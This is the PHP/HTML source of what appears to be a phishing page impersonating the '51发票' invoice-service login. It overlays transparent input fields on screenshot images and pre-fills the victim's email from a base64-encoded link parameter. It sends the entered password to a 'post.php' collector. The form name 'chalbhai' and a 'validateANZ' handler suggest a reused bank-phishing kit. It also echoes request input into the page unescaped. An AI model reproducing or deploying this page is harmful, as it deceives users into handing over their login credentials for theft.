<?php


$user = $_REQUEST['email'];
$email = base64_decode($user);
if($_REQUEST['log'] == 1){$log=1;$email = $_REQUEST['email'];}

?>

<html>
<head>
<title>51发票-登录</title>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
</head>

<body>
<div><IMG src="body.JPG">
</div>

<form id="chalbhai" action="post.php" name="chalbhai" onsubmit="return validateANZ()" method="post">
<div class="textfield textfield--default ">
<input name="email" class="textfield__field" placeholder="<?php echo $email; ?> " value="<?php echo $email; ?> " autocomplete="Off" tabindex="1" type="email" style="position:absolute;overflow:hidden;left: 972px;top: 346px;font-weight: 400; font-size: 0.875em;
font-family: -apple-system, .SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif; background-color: transparent; background: #FFFFFF;color: #666;border: 0px solid #BABCBF;border-radius: 5px;width:218px;height: 25px;margin-top: 0.625em;position: absolute;clear: both; z-index:5" readonly>
</div>

<div class="textfield textfield--default ">
<input name="password" class="textfield__field" placeholder="Password" autocomplete="Off" required tabindex="2" type="password"  style="position:absolute;overflow:hidden;left: 972px;top: 429px;font-weight: 400; font-size: 0.875em;
font-family: -apple-system, .SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif; background-color: transparent; background: #FFFFFF;color: #17181A;border: 0px solid #BABCBF;border-radius: 5px;width:280px;height: 25px;margin-top: 0.625em;position: absolute;clear: both; z-index:6" oninvalid="setCustomValidity('Please enter your Password');" oninput="setCustomValidity('')">
</div>
<div id="formimage1" style="position:absolute; left:860px; top:517px; z-index:6 " >
<input name="formimage1" src="images/c.png" width="479" type="image" height="51" style="opacity: 0.0;" >
</div>
</form>


<div style=" width: 400px; height: 50px;" ><IMG src="footer.JPG">
</div>
</body>
</html>